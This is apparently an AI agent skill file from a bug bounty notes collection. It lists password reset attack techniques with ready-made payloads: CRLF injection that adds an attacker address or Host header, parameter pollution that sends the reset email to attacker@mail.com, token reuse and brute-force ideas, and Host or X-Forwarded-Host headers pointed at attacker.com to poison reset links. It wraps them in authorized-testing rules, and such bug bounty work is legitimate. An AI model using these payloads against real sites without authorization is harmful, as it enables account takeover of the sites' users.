# SKILL: Password Reset Vulnerabilities — قائمة تقنيات شاملة

**Skill id:** `tip/password-reset-vulnerabilities-قائمة-تقنيات-شاملة`  
**Category:** Password Reset, Auth Bypass  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dcdac31e88081e3ab5fcfe194c8247e  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Password Reset, Auth Bypass**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

كل تقنية بتستهدف نقطة ضعف مختلفة في تدفق استعادة الباسورد: منطق الإيميل، صلاحية التوكن، أو الاعتماد على هيدرز يقدر المهاجم يتحكم فيها زي Host.

## Payload / Code

```
1) CRLF Injection:
  [email=victim@mail.com](mailto:email=victim@mail.com)%0d%0acc:[attacker@mail.com](mailto:attacker@mail.com)
  /resetpassword?%0d%0aHost:[attacker.com](http://attacker.com)

2) إضافة إيميلات إضافية:
  [email=victim@mail.com](mailto:email=victim@mail.com)&[email=attacker@mail.com](mailto:email=attacker@mail.com)
  \{"email":\["[victim@mail.com](mailto:victim@mail.com)","[attacker@mail.com](mailto:attacker@mail.com)"\]\}
  [email=victim@mail.com](mailto:email=victim@mail.com),[attacker@mail.com](mailto:attacker@mail.com)
  [email=victim@mail.com](mailto:email=victim@mail.com)%[20attacker@mail.com](mailto:20attacker@mail.com)

3) مشاكل الـ Token:
  - شوف هل التوكن بيترجع في الريسبونس
  - استخدم توكن إيميل تاني على لينك الضحية
  - جرّب Brute force
  - جرّب توكنات مستخدمة قبل كده
  - جرّب توكنات ضخمة (massive tokens)
  - شيل التوكن خالص وشوف بيحصل ايه

4) تغيير الهيدرز:
  X-Forwarded-Host: [attacker.com](http://attacker.com)
  Host: [attacker.com](http://attacker.com)
```

## Source

Ali @darkyfy — Credit: @wreckworm

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
